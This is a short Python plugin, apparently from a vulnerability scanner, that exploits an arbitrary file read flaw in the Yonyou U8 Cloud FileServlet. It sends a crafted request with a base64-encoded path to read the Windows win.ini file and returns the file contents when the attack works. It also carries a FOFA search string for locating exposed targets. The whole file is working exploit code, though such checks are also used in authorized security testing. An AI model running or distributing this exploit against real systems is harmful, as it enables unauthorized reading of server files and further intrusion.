#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/UjQdZANzuYC17yHFsoRo5w',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '用友U8C FileServlet 任意文件读取',

      'level'     :   'high',

      'FOFA'      :   'app="用友-U8-Cloud"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/8',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ=='
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret